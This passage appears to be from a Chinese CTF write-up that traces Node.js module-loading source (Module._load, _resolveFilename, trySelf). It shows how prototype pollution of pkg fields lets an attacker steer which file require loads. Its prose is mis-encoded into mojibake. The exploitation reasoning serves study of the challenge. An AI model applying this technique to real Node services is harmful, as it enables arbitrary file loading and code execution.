class="keyword">if</span> (parent !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    relativeResolveCache[relResolveCacheIdentifier] = filename;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> threw = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="title function_">load</span>(filename);</span><br><span class="line">    threw = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (threw) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">      <span class="keyword">if</span> (parent !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">        <span class="keyword">const</span> children = parent?.<span class="property">children</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">ArrayIsArray</span>(children)) &#123;</span><br><span class="line">          <span class="keyword">const</span> index = <span class="title class_">ArrayPrototypeIndexOf</span>(children, <span class="variable language_">module</span>);</span><br><span class="line">          <span class="keyword">if</span> (index !== -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title class_">ArrayPrototypeSplice</span>(children, index, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">module</span>.<span class="property">exports</span> &amp;&amp;</span><br><span class="line">               !<span class="title function_">isProxy</span>(<span class="variable language_">module</span>.<span class="property">exports</span>) &amp;&amp;</span><br><span class="line">               <span class="title class_">ObjectGetPrototypeOf</span>(<span class="variable language_">module</span>.<span class="property">exports</span>) ===</span><br><span class="line">                 <span class="title class_">CircularRequirePrototypeWarningProxy</span>) &#123;</span><br><span class="line">      <span class="title class_">ObjectSetPrototypeOf</span>(<span class="variable language_">module</span>.<span class="property">exports</span>, <span class="title class_">ObjectPrototype</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ä»ç¼“å­˜ç´¢å¼•ä¸­è¯»å–æ–‡ä»¶"><a href="#ä»ç¼“å­˜ç´¢å¼•ä¸­è¯»å–æ–‡ä»¶" class="headerlink" title="ä»ç¼“å­˜ç´¢å¼•ä¸­è¯»å–æ–‡ä»¶"></a>ä»ç¼“å­˜ç´¢å¼•ä¸­è¯»å–æ–‡ä»¶</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 1</span></span><br><span class="line"> <span class="keyword">let</span> relResolveCacheIdentifier;</span><br><span class="line"> <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">   <span class="title function_">debug</span>(<span class="string">&#x27;Module._load REQUEST %s parent: %s&#x27;</span>, request, parent.<span class="property">id</span>);</span><br><span class="line">   <span class="comment">// Fast path for (lazy loaded) modules in the same directory. The indirect</span></span><br><span class="line">   <span class="comment">// caching is required to allow cache invalidation without changing the old</span></span><br><span class="line">   <span class="comment">// cache key names.</span></span><br><span class="line">   relResolveCacheIdentifier = <span class="string">`<span class="subst">$&#123;parent.path&#125;</span>\x00<span class="subst">$&#123;request&#125;</span>`</span>;</span><br><span class="line">   <span class="keyword">const</span> filename = relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">   <span class="keyword">if</span> (filename !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">     <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">     <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">       <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>)</span><br><span class="line">         <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">       <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><code>relResolveCacheIdentifier</code>: è·¯å¾„ç¼“å­˜æ ‡è¯†ç¬¦ï¼Œç”±è·¯å¾„+\x00+è¯·æ±‚å‚æ•°ç»„æˆ</li><li><code>relativeResolveCache</code>: ç¼“å­˜æ–‡ä»¶è·¯å¾„å­˜å‚¨</li></ul><p>è¿™é‡Œçš„é€»è¾‘æ˜¯ä»<code>parent.path\x00request</code>ä¸­è·å–è·¯å¾„ç¼“å­˜æ ‡è¯†ç¬¦ï¼Œåœ¨<code>relativeResolveCache</code>ä¸­æŸ¥æ‰¾ã€‚</p><p>æœ¬é¢˜çš„<code>relResolveCacheIdentifier</code>:</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-2.png"><br>ç¼“å­˜æ–‡ä»¶è·¯å¾„å­˜å‚¨ä¸­ï¼Œåªä¿å­˜äº†ä¸‰ä¸ªå‚æ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªæ˜¯debugæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯server.jsï¼Œä¹Ÿåœ¨ç¼“å­˜æ–‡ä»¶ä¸­ï¼Œæ ‡è®°undefinedã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-3.png"></p><p>è¿™é‡Œå¦‚æœèƒ½æ‹¿åˆ°ç¼“å­˜æ–‡ä»¶ä¸­çš„å­˜å‚¨ï¼Œæ˜¯å¯ä»¥ä»<code>Module._cache[filename]</code>ä¸­è¯»å–ç¼“å­˜çš„ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰æˆ‘ä»¬è¦çš„.&#x2F;usageï¼Œæ‰€ä»¥æœ€ç»ˆæ²¡æœ‰ifè¯­å¥ï¼Œç›´æ¥è·³å‡ºã€‚</p><p>è¿™é‡Œå¯ä»¥åŸå‹é“¾æ±¡æŸ“å—ï¼Ÿä¸å¯ä»¥ï¼Œæ§åˆ¶å‚æ•°<code>parent.path</code>å’Œ<code>request</code>éƒ½ä¸å¯æ§ï¼Œå¿…å®šè·³å‡ºifè¯­å¥ã€‚å†åŠ ä¸Šç¼“å­˜æ–‡ä»¶ä¸­æ²¡æœ‰å‘½ä»¤æ‰§è¡Œçš„æ–‡ä»¶ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ç›®æ ‡ã€‚</p><h3 id="ä»-node-ä¸­åŠ è½½æ ¸å¿ƒæ¨¡å—"><a href="#ä»-node-ä¸­åŠ è½½æ ¸å¿ƒæ¨¡å—" class="headerlink" title="ä»`node:`ä¸­åŠ è½½æ ¸å¿ƒæ¨¡å—"></a>ä»`node:`ä¸­åŠ è½½æ ¸å¿ƒæ¨¡å—</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 2</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">&#x27;node:&#x27;</span>)) &#123;</span><br><span class="line">   <span class="comment">// Slice &#x27;node:&#x27; prefix</span></span><br><span class="line">   <span class="keyword">const</span> id = <span class="title class_">StringPrototypeSlice</span>(request, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title function_">loadBuiltinModule</span>(id, request);</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable language_">module</span>?.<span class="property">canBeRequiredByUsers</span>) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_UNKNOWN_BUILTIN_MODULE</span>(request);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-4.png"></p><p>æ ¸å¿ƒæ¨¡å—åœ¨æºä»£ç ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œè¢«ç¼–è¯‘æˆäº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œnodeè¿›ç¨‹å¯åŠ¨æ—¶ï¼Œéƒ¨åˆ†nodeæ ¸å¿ƒæ¨¡å—è¢«ç›´æ¥åŠ è½½è¿›å†…å­˜ï¼Œä¾‹å¦‚os, path, httpç­‰æ¨¡å—ï¼Œä»¥å¢åŠ è¿è¡Œé€Ÿåº¦ã€‚è€Œ<code>node:</code>çš„ç”¨æ³•åœ¨å‰ç‰ˆæœ¬ä¸­å¼•å…¥ï¼Œç›®çš„æ˜¯å¿«é€Ÿå®šä½æ ¸å¿ƒæ¨¡å—ï¼Œå¦‚æœè¯†åˆ«åˆ°<code>node:</code>ï¼Œè¿›å…¥ifè¯­å¥åŠ è½½æ ¸å¿ƒæ¨¡å—ï¼Œè‹¥æ²¡æœ‰åŠ è½½æˆåŠŸï¼ŒæŠ›å‡ºERRã€‚</p><p>ç”±äºusageä¸æ»¡è¶³æ¡ä»¶ï¼Œæ²¡è¿›å…¥å¾ªç¯ï¼ŒåŒæ ·ä¹Ÿä¸å¯æ§ã€‚</p><h3 id="é€šè¿‡ç»å¯¹è·¯å¾„åŠ è½½ç¼“å­˜å’Œæ ¸å¿ƒæ¨¡å—"><a href="#é€šè¿‡ç»å¯¹è·¯å¾„åŠ è½½ç¼“å­˜å’Œæ ¸å¿ƒæ¨¡å—" class="headerlink" title="é€šè¿‡ç»å¯¹è·¯å¾„åŠ è½½ç¼“å­˜å’Œæ ¸å¿ƒæ¨¡å—"></a>é€šè¿‡ç»å¯¹è·¯å¾„åŠ è½½ç¼“å­˜å’Œæ ¸å¿ƒæ¨¡å—</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// part 3</span></span><br><span class="line"> <span class="keyword">const</span> filename = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(request, parent, isMain);</span><br><span class="line"> <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line"> <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">   <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>) &#123;</span><br><span class="line">     <span class="keyword">const</span> parseCachedModule = cjsParseCache.<span class="title function_">get</span>(cachedModule);</span><br><span class="line">     <span class="keyword">if</span> (!parseCachedModule || parseCachedModule.<span class="property">loaded</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">     parseCachedModule.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> mod = <span class="title function_">loadBuiltinModule</span>(filename, request);</span><br><span class="line"> <span class="keyword">if</span> (mod?.<span class="property">canBeRequiredByUsers</span> &amp;&amp;</span><br><span class="line">     <span class="title class_">BuiltinModule</span>.<span class="title function_">canBeRequiredWithoutScheme</span>(filename)) &#123;</span><br><span class="line">   <span class="keyword">return</span> mod.<span class="property">exports</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ ·ä¹Ÿæ˜¯åŠ è½½ç¼“å­˜å’Œæ ¸å¿ƒæ¨¡å—ï¼Œä¸åŒçš„æ˜¯é€šè¿‡å¼•å…¥äº†fileçš„ç»å¯¹è·¯å¾„ï¼Œåˆ†åˆ«æŸ¥æ‰¾<code>Module._cache[filename]</code>å’Œ<code>BuiltinModule</code>ã€‚</p><p>è¿™é‡Œæ˜¯å¦å¯æ§å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>filename</code>é€šè¿‡<code>Module._resolveFilename(request, parent, isMain);</code>æ§åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†<code>filename</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>require</code>å‡½æ•°åŠ è½½ä»»æ„æ–‡ä»¶ã€‚</p><h2 id="è‡ªå®šä¹‰filename"><a href="#è‡ªå®šä¹‰filename" class="headerlink" title="è‡ªå®šä¹‰filename"></a>è‡ªå®šä¹‰filename</h2><h3 id="Module-resolveFilename-request-parent-isMain"><a href="#Module-resolveFilename-request-parent-isMain" class="headerlink" title="Module._resolveFilename(request, parent, isMain)"></a>Module._resolveFilename(request, parent, isMain)</h3><p>å‰é¢å‡ ä¸ªifè¯­å¥éƒ½æ²¡è¿›å…¥ä¸”ä¸å¯æ§</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> parentPath = <span class="title function_">trySelfParentPath</span>(parent);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> selfResolved = <span class="title function_">trySelf</span>(parentPath, request);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‡½æ•°ä¾ç„¶ä¸å¯æ§ï¼Œ<code>parentPath</code>ä¸ºè°ƒç”¨<code>require()</code>å‡½æ•°çš„åœ°å€ï¼Œè¿›å…¥<code>tryself(parentPath, request)</code></p><h3 id="trySelf-parentPath-request"><a href="#trySelf-parentPath-request" class="headerlink" title="trySelf(parentPath, request)"></a>trySelf(parentPath, request)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trySelf</span>(<span class="params">parentPath, request</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!parentPath) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; <span class="attr">data</span>: pkg, <span class="attr">path</span>: pkgPath &#125; = <span class="title function_">readPackageScope</span>(parentPath) || &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!pkg || pkg.<span class="property">exports</span> === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> pkg.<span class="property">name</span> !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> expansion;</span><br><span class="line">  <span class="keyword">if</span> (request === pkg.<span class="property">name</span>) &#123;</span><br><span class="line">    expansion = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">`<span class="subst">$&#123;pkg.name&#125;</span>/`</span>)) &#123;</span><br><span class="line">    expansion = <span class="string">&#x27;.&#x27;</span> + <span class="title class_">StringPrototypeSlice</span>(request, pkg.<span class="property">name</span>.<span class="property">length</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">      <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">      <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">code</span> === <span class="string">&#x27;ERR_MODULE_NOT_FOUND&#x27;</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="title function_">createEsmNotFoundErr</span>(request, pkgPath + <span class="string">&#x27;/package.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="attr">data</span>: pkg, <span class="attr">path</span>: pkgPath &#125; = <span class="title function_">readPackageScope</span>(parentPath) || &#123;&#125;;</span><br></pre></td></tr></table></figure><p>å…³æ³¨è¿™é‡Œçš„<code>pkg</code>å’Œ<code>pkgPath</code>ï¼Œç”±<code>readPackgeScope(parentPath)</code>è·å¾—ï¼Œè¯¥å‡½æ•°è´Ÿè´£ä»<code>parentPath</code>å¼€å§‹ï¼Œä¸€ç›´éå†åˆ°æ ¹ç›®å½•ï¼ŒæŸ¥æ‰¾package.jsonï¼Œå¦‚æœæ‰¾åˆ°package.jsonï¼Œå°±ä»æ–‡ä»¶ä¸­åŠ è½½å˜é‡ï¼›å¦åˆ™è¿”å›<code>undefined</code>ã€‚å¦‚æœæˆ‘ä»¬èƒ½è®©è¿™é‡Œè¿”å›<code>undefined</code>ï¼Œé‚£ä¹ˆç»™è¯¥å€¼èµ‹å€¼å°±ä¸º{}ï¼Œæ ¹æ®ä¸Šé¢çš„æ±¡æŸ“ï¼Œè€Œæˆ‘ä»¬èƒ½é€šè¿‡<code>&#123;&#125;</code>çš„<code>__proto__</code>æ¥æ§åˆ¶<code>data</code>å’Œ<code>path</code>ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬èƒ½ç¡®å®š<code>readPackageScope(parentPath)</code>è¿”å›falseå—ï¼Ÿèƒ½ï¼Œè¿›å…¥é¢˜ç›®dockerç¯å¢ƒï¼Œå¯ä»¥çœ‹åˆ°Jsæ–‡ä»¶åœ¨&#x2F;appä¸‹ï¼Œè¿™ä¸¤ä¸ªç›®å½•ä¸­æ²¡æœ‰åŒ…æ‹¬package.jsonï¼ˆè¿™é‡Œæœ‰ä¸ªè›‹ç–¼çš„åœ°æ–¹æ˜¯package.jsoné¢˜ç›®é™„ä»¶ç»™æˆ‘ä»¬äº†ï¼Œå¯¼è‡´ideaè°ƒè¯•ä¸€ç›´å¡åœ¨è¿™ï¼Œåæ¥æŠŠpackage.jsonåˆ äº†æ‰èƒ½ç”¨ï¼‰ã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-6.png"></p><p>æ‰€ä»¥è¿™é‡Œçš„pkgå’ŒpkgPathæ˜¯å¯æ§çš„å€¼ã€‚æ¥ä¸‹æ¥å°±æ˜¯ç ”ç©¶æ§åˆ¶è¿™ä¸¤ä¸ªå€¼å¦‚ä½•åˆ©ç”¨ï¼Œè¿›è€Œä¿®æ”¹filenameã€‚</p><h2 id="ç»“åˆdebugè°ƒå‚"><a href="#ç»“åˆdebugè°ƒå‚" class="headerlink" title="ç»“åˆdebugè°ƒå‚"></a>ç»“åˆdebugè°ƒå‚</h2><p>åˆ†åˆ«è¿›è¡Œæ¯ä¸€è¡Œçš„è°ƒè¯•ï¼Œæ‰¾åˆ°é¢˜ç›®éœ€è¦èµ‹å€¼çš„åœ°æ–¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pkg || pkg.<span class="property">exports</span> === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">typeof</span> pkg.<span class="property">name</span> !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸¤ä¸ª<code>if</code>è¯­å¥ï¼Œæˆ‘ä»¬è¦ä¿è¯<code>pkg</code>ä¸ä¸ºç©ºä¸”<code>pkg.exports!=undefined</code>ï¼Œæˆ‘ä»¬è¿›è¡Œèµ‹å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg = &#123;<span class="string">&quot;exports&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€å¾€ä¸‹ï¼Œéœ€è¦å¯¹<code>pkg.name</code>èµ‹å€¼å­—ç¬¦ä¸²</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg.<span class="property">name</span> = <span class="string">&quot;2&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-7.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿‡æ‰ä¸¤ä¸ª<code>if</code>è¯­å¥ï¼Œçœ‹æ¥ä¸‹æ¥çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (request === pkg.<span class="property">name</span>) &#123;</span><br><span class="line">   expansion = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">`<span class="subst">$&#123;pkg.name&#125;</span>/`</span>)) &#123;</span><br><span class="line">   expansion = <span class="string">&#x27;.&#x27;</span> + <span class="title class_">StringPrototypeSlice</span>(request, pkg.<span class="property">name</span>.<span class="property">length</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚â‘ <code>request == pkg.name</code>â‘¡<code>StringPrototypeStartsWith(request, `$&#123;pkg.name&#125;/`) != 0</code>ï¼Œå¦åˆ™è¿”å›falseï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ä¹‹ä¸€ã€‚</p><p>è¿™é‡Œrequestçš„å€¼æ˜¯å›ºå®šçš„â€.&#x2F;usageâ€ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„requestæœ‰äº†ä¸¤ç§å–å€¼çš„å¯èƒ½</p><ul><li>.&#x2F;usage</li><li>.</li></ul><p>æˆ‘ä»¬å…ˆè®¾å®š<code>pkg.name = &quot;./usage&quot;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°çš„<code>expansion=.</code>ã€‚æ¥ç€å‘ä¸‹ï¼Œè¿›å…¥<code>return</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">   <span class="keyword">if</span> (e.<span class="property">code</span> === <span class="string">&#x27;ERR_MODULE_NOT_FOUND&#x27;</span>)</span><br><span class="line">     <span class="keyword">throw</span> <span class="title function_">createEsmNotFoundErr</span>(request, pkgPath + <span class="string">&#x27;/package.json&#x27;</span>);</span><br><span class="line">   <span class="keyword">throw</span> e;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>return</code>è¯­å¥è¾ƒä¸ºå¤æ‚ï¼Œå…ˆè°ƒç”¨äº†ä¸¤ä¸ª<code>pathToFileURL()</code>ï¼Œä½œä¸º<code>packageExportsResolve(arg5)</code>çš„ç¬¬ä¸€ä¸ªå˜é‡å’Œç¬¬å››ä¸ªå˜é‡ä¼ å…¥ï¼Œè¿”å›çš„å€¼ä½œä¸º<code>finalizeEsmResolution(arg3)</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥ï¼Œæœ€åè¿”å›filenameã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_">finalizeEsmResolution</span>(<span class="title function_">packageExportsResolve</span>(</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(pkgPath + <span class="string">&#x27;/package.json&#x27;</span>), expansion, pkg,</span><br><span class="line">     <span class="title function_">pathToFileURL</span>(parentPath), cjsConditions), parentPath, pkgPath);</span><br></pre></td></tr></table></figure><h3 id="pathToFileURL"><a href="#pathToFileURL" class="headerlink" title="pathToFileURL"></a>pathToFileURL</h3><p>pathToFileURLä¼šè¿”å›URLå¯¹è±¡ï¼Œéšä¾¿ç»™pkgPathèµ‹å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkgPath = <span class="string">&quot;/xxxpath&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ†åˆ«æŸ¥çœ‹è¿”å›çš„ä¸¤ä¸ªå¯¹è±¡ï¼š</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-11.png"></p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-9.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ç”±äºæˆ‘ä»¬ä¼ å…¥çš„<code>pkgPath</code>ä¸º<code>xxxpath</code>ï¼Œè¿™ä¸ªå–å€¼æˆ‘ä»¬æ ¹æ®åé¢å†è°ƒæ•´ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯è°ƒç”¨<code>require()</code>çš„å‚æ•°è·¯å¾„ã€‚</p><h3 id="packageExportsResolve"><a href="#packageExportsResolve" class="headerlink" title="packageExportsResolve"></a>packageExportsResolve</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">packageExportsResolve</span>(<span class="params"></span></span><br><span class="line"><span class="params">  packageJSONUrl, packageSubpath, packageConfig, base, conditions</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="built_in">exports</span> = packageConfig.<span class="property">exports</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isConditionalExportsMainSugar</span>(<span class="built_in">exports</span>, packageJSONUrl, 